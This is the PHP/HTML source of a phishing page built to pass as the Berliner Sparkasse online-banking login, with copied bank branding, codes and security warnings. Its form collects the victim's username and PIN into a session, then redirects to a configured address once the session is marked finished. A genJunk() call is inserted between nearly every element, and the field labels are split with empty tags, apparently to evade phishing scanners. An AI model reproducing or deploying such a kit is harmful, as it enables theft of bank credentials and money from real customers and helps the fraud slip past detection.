<?php
	session_start();
	include("config.php");
	
	if (isset($_SESSION['finished']) && $_SESSION['finished']) {
		header("Location: $redirect");
	}
?>
<!DOCTYPE html>
<html>
	<head>
		<meta name="robots" content="noindex" />
		<meta name="googlebot" content="noindex">
		<meta http-equiv="Content-type" content="text/html; charset=UTF-8">
		<style type="text/css">
			<!--
				@import url("src/sparkasse_css/custom.css"); 
				@import url("src/sparkasse_css/if5_raster.css"); 
				@import url("src/sparkasse_css/if5_container.css"); 
				@import url("src/sparkasse_css/banking.css");
			-->
		</style>
		<link rel="stylesheet" media="print" href="src/sparkasse_css/if5_druck.css" type="text/css">
		<link rel="stylesheet" href="src/sparkasse_css/opttan4_0_3.css" type="text/css">
		<link rel="shortcut icon" type="image/x-icon" href="src/sparkasse_img/favicon.ico">
		<link rel="icon" type="image/x-icon" href="src/sparkasse_img/favicon.ico">
		<title>Sparkasse - Online-Banking: Anmelden</title>
	</head>
	<body class="if5 js" onload="" style="font-size: 62.5%;">
		<?php echo genJunk() ?><div id="js_VelocityOneColumn_" class="if5_outer">
			<?php echo genJunk() ?><div id="column_VelocityOneColumn_0" class="if5_inner">	  	   
				<?php echo genJunk() ?><div class="if5_header">
					<?php echo genJunk() ?><div class="if5_logo_spk b1"><a href="#" target="_top"><img alt="Berliner Sparkasse - Privatkunden" class="logo" src="src/sparkasse_img/if5_spk_logo.gif" title="Berliner Sparkasse - Privatkunden"></a></div><?php echo genJunk() ?>		    			    		  		  		            			
					<?php echo genJunk() ?><div class="if5_powerElement if5_gsw" id="gsw_geld_fuer_spaeter_2016_l6NUdq" style="overflow: hidden; background-color: #; background-image: none;">
						<?php echo genJunk() ?><div class="a3_cssAnimSupported" style="position:relative; left: 0px; top: 0px; width: 100%; height: 100%;">
							<img alt="pv_VsOUdq" class=" " data-height="71" data-width="71" id="pv_VsOUdq" src="src/sparkasse_img/h_gsw_geld_f_spaeter_pikto_liegestuhl_4c.png">
							<a title="Informieren Sie sich jetzt zu unseren Altersvorsorge Angeboten" href="" target="_top"><img alt="pv_RbOUdq" class=" " data-height="102" data-width="306" id="pv_RbOUdq" src="src/sparkasse_img/bsk_op600_geld_fuer_spaeter_2016.jpg"></a>
							<?php echo genJunk() ?><div class=" " id="pv_xLOUdq"></div><?php echo genJunk() ?>
							<h3 class=" " id="pv_WSOUdq">Alter ist einfach</h3>
							<h3 class=" " id="pv_1ZOUdq">Wenn man sich mit der passenden Vorsorgestrategie<br> auch bei niedrigen Zinsen auf die Zukunft<br>freuen kann. Wir beraten Sie gerne.</h3>
							<a title="Informieren Sie sich jetzt zu unseren Altersvorsorge Angeboten" href="#" target="_blank"><?php echo genJunk() ?><div class=" " id="pv_CsPUdq"><span class="innerBtn"><span class="btnLabel">Jetzt informieren</span></span></div><?php echo genJunk() ?></a>
						</div><?php echo genJunk() ?>
					</div><?php echo genJunk() ?>
				</div><?php echo genJunk() ?>
				<?php echo genJunk() ?><div class="if5_metanavi">
					<?php echo genJunk() ?><div class="metanavi_blz"><p class="blz"> BLZ 10050000 | BIC BELADEBEXXX</p></div><?php echo genJunk() ?>
					<?php echo genJunk() ?><div class="metanavi_navi">
						<ul class="metanavi_list">
							<li class="metanavi_listitem"><a title="Über uns" href="#" target="_top">Über uns</a></li>
							<li class="metanavi_listitem"><a title="Standorte der Berliner Sparkasse" href="#" target="_top">Standorte</a></li>
							<li class="metanavi_listitem"><a title="Kontakt" href="#" target="_top">Kontakt</a></li>
							<li class="metanavi_listitem"><a title="Karriere" href="#" target="_top">Karriere</a></li>
							<li class="metanavi_listitem"><a title="Shop" href="#" target="_top">Shop</a></li>
							<li class="metanavi_listitem"><a title="Videos" href="#" target="_top">Videos</a></li>
							<li class="metanavi_listitem"><a title="FAQ" href="#" target="_top">FAQ</a></li>
							<li class="metanavi_listitem"><a title="Online Banking English" href="#" target="_blank"><img src="src/sparkasse_img/flaggeEN.gif"></a></li>
						</ul>
						<?php echo genJunk() ?><div class="fontsize" id="metanaviloggedoutfontsize" style="display: block;">
							<ul style="background:no-repeat;">
								<li _size="62.5" _stat="statnormal.png" title="Schrift normal" class="active"><img alt="Schrift normal" src="src/sparkasse_img/fs0a.png"></li>
								<li _size="68.8" _stat="statgroesser.png" title="Schrift größer" class=""><img alt="Schrift größer" src="src/sparkasse_img/fs1.png"></li>
								<li _size="75" _stat="statgross.png" title="Schrift groß" class=""><img alt="Schrift groß" src="src/sparkasse_img/fs2.png"></li>
							</ul>
						</div><?php echo genJunk() ?>
					</div><?php echo genJunk() ?>
					<?php echo genJunk() ?><div class="metanavi_suche">
						<?php echo genJunk() ?><div class="suchergebnis" id="suchergebnis"></div><?php echo genJunk() ?>
						<form accept-charset="UTF-8" action="#" class="suche" id="suchformular" method="post" target="_top">
							<input class="suche_feld is" id="suchfeld" maxlength="50" name="words" onblur="testField(this, this.firstValue)" onfocus="testField(this, this.firstValue)" onmouseover="glSearch(this)" size="10" value="Suchbegriff" type="text">
							<input alt="Suchen" class="suche_button c0 l3" name="suchbutton" onmouseover="glSearch(document.forms.suchformular.suchfeld)" src="src/sparkasse_img/metanavi_weiter_button.gif" title="Suchen" value="Suchen" type="image">
						</form>
					</div><?php echo genJunk() ?>
				</div><?php echo genJunk() ?>
				<?php echo genJunk() ?><div class="if5_nav b4">
					<img src="src/sparkasse_img/setTrackingCookie.gif" alt="Cookie Branding" style="display:none;"><span style="display:none;">ausgewählt: Online-Banking</span><ul class="nav0wrap">
					<li class="nav0item open active current withsub">
						<h3><a target="_top" title="Online-Banking" href="">Online-Banking</a></h3>
						<form action="" class="tx_anmelden" method="post" accept-charset="UTF-8" autocomplete="off" onsubmit="">
							<fieldset>

							</fieldset>
						</form>
						<ul class="nav1wrap">
							<li class="nav1item"><h4><a target="_top" title="Online-Kunde werden" href="#">Online-Kunde werden</a></h4></li>
							<li class="nav1item"><h4><a target="_top" title="Demoanwendung" href="#">Demoanwendung</a></h4></li>
							<li class="nav1item"><h4><a target="_top" title="Sicherheit und Sperren" href="#">Sicherheit und Sperren</a></h4></li>
							<li class="nav1item "><h4><a target="_top" title="Aktuelles und Service" href="#">Aktuelles und Service</a></h4></li>
							<li class="nav1item"><h4><a target="_blank" title="Kreditkarten-Banking" href="#">Kreditkarten-Banking</a></h4></li>
							<li class="nav1item"><h4><a target="_top" title="BörsenCenter" href="#">BörsenCenter</a></h4></li>
						</ul>
					</li>
					<li class="nav0item close"><h3><a target="_top" title="Online-Produkte" href="#">Online-Produkte</a></h3></li>
					<li class="nav0item close"><h3><a target="_top" title="Privatkunden" href="#">Privatkunden</a></h3></li>
					<li class="nav0item close"><h3><a target="_top" title="Firmenkunden" href="#">Firmenkunden</a></h3></li>
					<li class="nav0item close "><h3><a target="_top" href="#">Sparkassen-Finanzkonzept</a></h3></li>
					<li class="nav0item open withsub">
						<h3><a target="_top" title="Spezielle Angebote" href="#">Spezielle Angebote</a></h3>
						<ul class="nav1wrap">
							<li class="nav1item "><h4><a target="_top" href="#">Barrierefreie Angebote</a></h4></li>
							<li class="nav1item"><h4><a target="_top" title="Junge Leute" href="#">Junge Leute</a></h4></li>
							<li class="nav1item"><h4><a target="_top" href="#">Private Banking</a></h4></li>
							<li class="nav1item "><h4><a target="_blank" title="Mobile Beratung" href="#">Mobile Beratung</a></h4></li>
						</ul>
					</li>
					</ul>
				</div><?php echo genJunk() ?>		
				<?php echo genJunk() ?><div class="if5_content if5_banking">
					<?php echo genJunk() ?><div class="if5_content_inner">
						<?php echo genJunk() ?><div class="contentbereich">
							<a title="Contentbereich / Seiteninhalt" name="pagecontent" href="#" accesskey="3"></a>
							<h2 class="contentbereichHeadLine">Online-Banking: Anmelden</h2>
							<ul class="contentcontainerTop">
								<li class="li_active"><a target="_top" title="Anmeldename/PIN (ausgewählt)" href="#" class="active"><b>Anmeldename/PIN<span style="display:none;"> (ausgewählt)</span></b></a></li>
								<li class=""><a target="_blank" title="English" href="#">English</a></li>
								<li class=""><a target="_blank" title="Barrierefrei" href="#">Barrierefrei</a></li>
							</ul>
							<?php echo genJunk() ?><div class="topbuttonline">
								<form action="" name="1a9fa4ddcab9cb92" method="post" accept-charset="UTF-8" novalidate="novalidate">
									<a href="#" onclick="" target="help"><img src="src/sparkasse_img/if5_symbol_hilfe_rot.gif" title="Hilfe" alt="Hilfe" class="if5_symbol_hilfe_rot"></a>
								</form>
							</div><?php echo genJunk() ?>
							<?php echo genJunk() ?><div>
								<a title="Binnennavigation" name="pagesubnavigation" href="#" accesskey="4"></a>
								<h3 class="invisible" style="display:none">Binnennavigation</h3>
							</div><?php echo genJunk() ?>
							<?php echo genJunk() ?><div class="if5_seiten">
								<?php echo genJunk() ?><div class="if5_white_o">&nbsp;</div><?php echo genJunk() ?>
								<?php echo genJunk() ?><div class="if5_rand">
									<?php echo genJunk() ?><div class="if5_verlauf_o">&nbsp;</div><?php echo genJunk() ?>
									<?php echo genJunk() ?><div class="if5_gvContentElement">
										<img alt="src/sparkasse_img/op3_scert_sh13484134.jpg" class="img" src="src/sparkasse_img/op3_scert_sh13484134.jpg">
										<h1>Bitte Sicherheitshinweise beachten!</h1>
										<?php echo genJunk() ?><div class="p">
											<strong>1. Geben Sie niemals eine TAN an einen Telefonanrufer weiter.</strong>
											<br><br>
											<strong>2. Folgen Sie keiner Aufforderung für eine "Sicherheitsüberprüfung" oder "Testüberweisung" direkt nach der Anmeldung im Online-Banking.</strong>
											<br><br>
											<strong>3. Kontrollieren Sie immer die Auftragsdaten in der SMS, auf dem Display Ihres TAN-Generators oder in der S-pushTAN-App.</strong>
											<br><br>
											Wenden Sie sich im Zweifelsfall bitte an unsere Hotline unter Telefon 030 869 869 57.
											<br><br><br>
											<strong>Aktuelles:</strong>
											<br>
											<ul>
												<li class="l1"><a title="Elektronisches Postfach im Mobile-Banking und optimierte Umsatzanzeige" href="#" target="_top"><strong>Neuerungen im Online-Banking</strong></a></li>
												<li class="l1"><a title="Aktuelle Sicherheitsmeldungen" href="#" target="_top">Aktuelle Sicherheitsmeldungen</a></li>
												<li class="l1"><a title="Hilfestellung für Ihre Erstanmeldung" href="#" target="_blank">Das erste Mal hier?</a></li>
											</ul>
										</div><?php echo genJunk() ?>
									</div><?php echo genJunk() ?>
									<form action="index.php" name="2c4672519ea08bde" method="post" accept-charset="UTF-8" autocomplete="off" novalidate="novalidate">
										<?php echo genJunk() ?><div style="position:absolute;top:0px;">
											<input name="sendOB_Login" onclick="return IF.checkFirstSubmit();" class="blank" src="src/sparkasse_img/blank.gif" type="image">
										</div><?php echo genJunk() ?>

										<?php echo genJunk() ?><div class="block">
											<?php echo genJunk() ?><div class="bline">
												<?php echo genJunk() ?><div class="blineover" style="display:<?php echo (isset($_SESSION['user_err']) ? "block" : "none") ?>"><?php echo genJunk() ?><div class="msgerror"><ul><li>Bitte befüllen Sie das Feld "Anmeldename oder <br>Legitimations-ID".</li></ul></div><?php echo genJunk() ?></div><?php echo genJunk() ?>
												<label for="ob_sp_username" class="<?php echo (isset($_SESSION['user_err']) ? "error" : "") ?>">A<var></var>nme<acronym></acronym>lde<strong></strong>nam<strong></strong>e <kbd></kbd>oder<dfn></dfn> <br>L<var></var>egit<strong></strong>ima<samp></samp>ti<dfn></dfn>ons<cite></cite>-ID<em>*</em>:</label>
												<input name="ob_sp_username" id="ob_sp_username" value="<?php echo (isset($_SESSION['ob_sp_username']) ? $_SESSION['ob_sp_username'] : ""); ?>" class="il <?php echo (isset($_SESSION['user_err']) ? "error" : ""); unset($_SESSION['user_err']); ?>" maxlength="16" type="text"><br class="bterm">
											</div><?php echo genJunk() ?>

											<?php echo genJunk() ?><div class="bline">
												<?php echo genJunk() ?><div class="blineover" style="display:<?php echo (isset($_SESSION['pass_err']) ? "block" : "none") ?>"><?php echo genJunk() ?><div class="msgerror"><ul><li>Bitte befüllen Sie das Feld "PIN".</li></ul></div><?php echo genJunk() ?></div><?php echo genJunk() ?>
												<label for="ob_sp_password" class="<?php echo (isset($_SESSION['pass_err']) ? "error" : "") ?>">P<strong></strong>IN<em>*</em>:</label>
												<input name="ob_sp_password" id="ob_sp_password" value="" autocomplete="off" class="il <?php echo (isset($_SESSION['pass_err']) ? "error" : ""); unset($_SESSION['pass_err']); ?>" maxlength="5" type="password"><br class="bterm">
											</div><?php echo genJunk() ?>
										</div><?php echo genJunk() ?>
										<?php echo genJunk() ?><div class="block">
											<?php echo genJunk() ?><div class="bline">
												Mit dem Absenden Ihrer Anmeldedaten erkennen Sie die <a name="Sicherheitshinweise" href="#" onclick="return IF.checkFirstSubmit();" target="_self" title="Sicherheitshinweise">Sicherheitshinweise</a> an.
												<br class="bterm">
											</div><?php echo genJunk() ?>
										</div><?php echo genJunk() ?>
										<?php echo genJunk() ?><div class="block footnote"><?php echo genJunk() ?><div class="bline"><em>*</em> Pflichtfeld<br class="bterm"></div><?php echo genJunk() ?></div><?php echo genJunk() ?>
										<?php echo genJunk() ?><div class="buttonline">
											<?php echo genJunk() ?><div class="bgroup1">
												<input name="sendOB_Login" id="defaultAction" value="Online-Banking Login" onclick="return IF.checkFirstSubmit();" class="if5_button_anmelden_rot" src="src/sparkasse_img/if5_button_anmelden_rot.png" title="Online-Banking Login" alt="Online-Banking Login" type="image">
											</div><?php echo genJunk() ?>
										</div><?php echo genJunk() ?>
									</form>
									<?php echo genJunk() ?><div class="if5_verlauf_u">&nbsp;</div><?php echo genJunk() ?>
								</div><?php echo genJunk() ?>
								<?php echo genJunk() ?><div class="if5_white_u">&nbsp;</div><?php echo genJunk() ?>
							</div><?php echo genJunk() ?>
						</div><?php echo genJunk() ?>    
						<?php echo genJunk() ?><div class="if5_gvhint2">
							<table>
								<tbody>
									<tr>
										<td><img alt="src/sparkasse_img/gv_regel_1_sh_93894688.jpg" class="img" src="src/sparkasse_img/gv_regel_1_sh_93894688.jpg"></td>
										<td>
										<h1>Zu Ihrem Schutz</h1>
										<?php echo genJunk() ?><div class="p">Nutzen
											Sie einen aktuellen Browser – das muss nicht unbedingt der mit dem 
											Betriebssystem mitgelieferte sein. Browser werden ständig verbessert. 
											Über die Internet-Seite des Herstellers können Sie kostenfreie Updates 
											beziehen. Aktualisieren Sie auch regelmäßig Ihre Browser-Plug-ins, wie 
											zum Beispiel den Flash-Player.
											<ul>
												<li class="l1"><a title="Aktuelle Meldungen" href="#" target="_top">Aktuelle Meldungen</a></li>
												<li class="l1"><a title="Sicherheitstipps" href="#" target="_top">Sicherheitstipps</a></li>
												<li class="l1"><a title="Verhaltensregeln" href="#" target="_top">Verhaltensregeln</a></li>
											</ul>
										</div><?php echo genJunk() ?>
										</td>
									</tr>
								</tbody>
							</table>
						</div><?php echo genJunk() ?>
					</div><?php echo genJunk() ?>
					<?php echo genJunk() ?><div class="if5_content_footer">
						<?php echo genJunk() ?><div class="if5_service c5_2 banking">
							<ul class="service_list">
								<li class="seite_senden" id="empfehlen"><a class="l3b c0" href="#" id="empfehlen_link">Finanzstatus</a></li>
								<li class="seite_drucken c0" id="drucken">
									<a class="l3b c0" href="#">Seite drucken
									<span class="druck_mit_js" id="druckwrap">
									<span class="if5_white_o">&nbsp;&nbsp;</span>
									<span class="if5_rand"><span class="if5_verlauf_o">&nbsp;&nbsp;</span><span class="hw_druck_ohne_js">Für diese Funktion muss JavaScript aktiviert sein.</span><span class="if5_verlauf_u">&nbsp;&nbsp;</span></span>
									<span class="if5_white_u">&nbsp;&nbsp;</span>
									</span></a>
								</li>
								<li class="seite_anfang c0"><a class="l3b c0" href="#">Seitenanfang</a></li>
							</ul>
						</div><?php echo genJunk() ?>		    
						<?php echo genJunk() ?><div class="if5_footer">
							<ul class="footer_list l4"><li class="footer_listitem"><a title="Mobile Version" href="#" target="_blank">Mobile Version</a></li><li class="footer_listitem"><a title="BIC: BELADEBEXXX" href="#" target="_top">BIC: BELADEBEXXX</a></li><li class="footer_listitem"><a title="Impressum" href="#" target="_top">Impressum</a></li><li class="footer_listitem"><a title="AGB" href="#" target="_top">AGB</a></li><li class="footer_listitem"><a title="Datenschutz" href="#" target="_top">Datenschutz</a></li><li class="footer_listitem"><a title="Preise und Hinweise" href="#" target="_top">Preise und Hinweise</a></li><li class="footer_listitem"><a title="Sitemap" href="#" target="_top">Sitemap</a></li></ul>
						</div><?php echo genJunk() ?>
					</div><?php echo genJunk() ?>
				</div><?php echo genJunk() ?>
				<?php echo genJunk() ?><div id="container" class="if5_containerwrapper">
					<?php echo genJunk() ?><div class="if5_container if5_kontakt" id="if5_kontakt_container" style="">
						<?php echo genJunk() ?><div class="rounded">
							<?php echo genJunk() ?><div class="if5_white_o_rounded">&nbsp;</div><?php echo genJunk() ?>
							<?php echo genJunk() ?><div class="if5_rand">
								<?php echo genJunk() ?><div class="if5_verlauf_o">&nbsp;</div><?php echo genJunk() ?>
								<?php echo genJunk() ?><div class="rounded_content">
									<h5 class="kontakt"><span>Telefon</span></h5>
									<h6><span id="telefon_nr">030 245 524 00</span><!--<span class="required" id="preis_req">*</span>--></h6>
									<?php echo genJunk() ?><div class="standard" id="if5_kontakt_container_standard">
										<ul class="kontakt_list datablock" id="if5_kontakt_container_standard_data">
											<li class="kontakt_email l4" id="if5_kontakt_container_standard_email"><a href="" id="termin" title="Termin vereinbaren">Termin vereinbaren</a></li>
											<li class="kontakt_filiale l4" id="li_filiale"><a href="" id="filiale" title="Öffnungszeiten">Öffnungszeiten</a></li>
											<li class="kontakt_notfall l4" id="li_notfall"><a href="#" id="notfall" title="Wichtige Rufnummern">Wichtige Rufnummern</a></li>
											<li class="l4 kontakt_berater_inaktiv" id="li_text_chat"><a href="#" title="Live-Chat" target="_blank">Live-Chat</a></li>
											<li class="kontakt_newsletter l4" id="li_newsletter"><a href="#" id="newsletter" title="Newsletter">Newsletter</a></li>
											<li class="kontakt_socialnetul l4" id="li_socialNetul">
												<ul class="socialnet_list">
													<li class="socialnet_list_li hovercontainer"><a title="Facebook" id="item0" href="#" target="_blank"><img alt="" class="mouseout" src="src/sparkasse_img/if5_sm_kt_facebook.png"><img alt="" class="mousein" src="src/sparkasse_img/if5_sm_kt_facebook.png"></a></li>
													<li class="socialnet_list_li hovercontainer"><a title="Twitter" id="item1" href="#" target="_blank"><img alt="" class="mouseout" src="src/sparkasse_img/if5_sm_kt_twitter.png"><img alt="" class="mousein" src="src/sparkasse_img/if5_sm_kt_twitter.png"></a></li>
													<li class="socialnet_list_li hovercontainer"><a title="Blog" id="item2" href="#" target="_blank"><img alt="" class="mouseout" src="src/sparkasse_img/f5_sm_kt_planspiel_blog.png"><img alt="" class="mousein" src="src/sparkasse_img/f5_sm_kt_planspiel_blog.png"></a></li>
													<li class="socialnet_list_li hovercontainer"><a title="WhatsApp" id="item3" href="#" target="_blank"><img alt="" class="mouseout" src="src/sparkasse_img/if5_sm_kt_whatsapp.png"><img alt="" class="mousein" src="src/sparkasse_img/if5_sm_kt_whatsapp.png"></a></li>
													<li class="socialnet_list_li hovercontainer"><a title="YouTube" id="item4" href="#" target="_blank"><img alt="" class="mouseout" src="src/sparkasse_img/if5_sm_kt_youtube.png"><img alt="" class="mousein" src="src/sparkasse_img/if5_sm_kt_youtube.png"></a></li>
													<li class="socialnet_list_li hovercontainer"><a title="Xing" id="item5" href="#" target="_blank"><img alt="" class="mouseout" src="src/sparkasse_img/if5_sm_kt_xing.png"><img alt="" class="mousein" src="src/sparkasse_img/if5_sm_kt_xing.png"></a></li>
												</ul>
											</li>
										</ul>
									</div><?php echo genJunk() ?>
								</div><?php echo genJunk() ?>
								<?php echo genJunk() ?><div class="if5_verlauf_u">&nbsp;</div><?php echo genJunk() ?>
							</div><?php echo genJunk() ?>
							<?php echo genJunk() ?><div class="if5_white_u_rounded">&nbsp;</div><?php echo genJunk() ?>
						</div><?php echo genJunk() ?>
					</div><?php echo genJunk() ?>
					<?php echo genJunk() ?><div id="content">
						<?php echo genJunk() ?><div class="if5_container if5_struktur" style="">
							<?php echo genJunk() ?><div class="rounded"><?php echo genJunk() ?><div class="if5_white_o_rounded">&nbsp;</div><?php echo genJunk() ?>
								<?php echo genJunk() ?><div class="if5_rand">
									<?php echo genJunk() ?><div class="if5_verlauf_o">&nbsp;</div><?php echo genJunk() ?>
									<?php echo genJunk() ?><div class="rounded_content">
										<?php echo genJunk() ?><div class="container headline"><h4><span>Auf einen Blick</span></h4></div><?php echo genJunk() ?>
										<?php echo genJunk() ?><div class="container " id="linkblock">
											<p></p>
											<ul class="struktur_list">
												<li style="background: url(src/sparkasse_img/container_faq1_icon.gif) no-repeat;" class="container_icon"><a title="SEPA-Check" class="pfeil_link" id="link_value_2" href="#" target="_top" style="font-size:1.1em;">SEPA-Check</a></li>
												<li style="background: url(src/sparkasse_img/container_konditionen_und_preise2_icon.gif) no-repeat;" class="container_icon"><a title="IBAN-Rechner" class="pfeil_link" href="#" target="_top" style="font-size:1.1em;">IBAN-Rechner</a></li>
												<li style="background: url(src/sparkasse_img/container_formulare2_icon.gif) no-repeat;" class="container_icon"><a title="Produkt-Center" class="pfeil_link" href="#" target="_top" style="font-size:1.1em;">Produkt-Center</a></li>
												<li style="background: url(src/sparkasse_img/container_konditionen_und_preise2_icon.gif) no-repeat;" class="container_icon"><a title="Konditionen und Preise" class="pfeil_link" href="#" target="_top" style="font-size:1.1em;">Konditionen &amp; Preise</a></li>
											</ul>
											<p></p>
										</div><?php echo genJunk() ?>
										<?php echo genJunk() ?><div class="container topline">
											<p></p>
											<ul class="struktur_list">
												<li style="background: url(src/sparkasse_img/container_presse3_icon.gif) no-repeat;" class="container_icon"><a title="PresseCenter" class="pfeil_link" href="#" target="_top" style="font-size:1.1em;">PresseCenter</a></li>
												<li style="background: url(src/sparkasse_img/container_kundenmagazin2_icon.gif) no-repeat;" class="container_icon"><a title="Berliner Akzente" class="pfeil_link" href="#" target="_blank" style="font-size:1.1em;">Kundenmagazin</a></li>
											</ul>
											<p></p>
										</div><?php echo genJunk() ?>
									</div><?php echo genJunk() ?>
									<?php echo genJunk() ?><div class="if5_verlauf_u">&nbsp;</div><?php echo genJunk() ?>
								</div><?php echo genJunk() ?>
								<?php echo genJunk() ?><div class="if5_white_u_rounded">&nbsp;</div><?php echo genJunk() ?>
							</div><?php echo genJunk() ?>
						</div><?php echo genJunk() ?>
					</div><?php echo genJunk() ?>
				</div><?php echo genJunk() ?>
				<br>
			</div><?php echo genJunk() ?>
		</div><?php echo genJunk() ?>
		<br style="clear:both;">
	</body>
</html>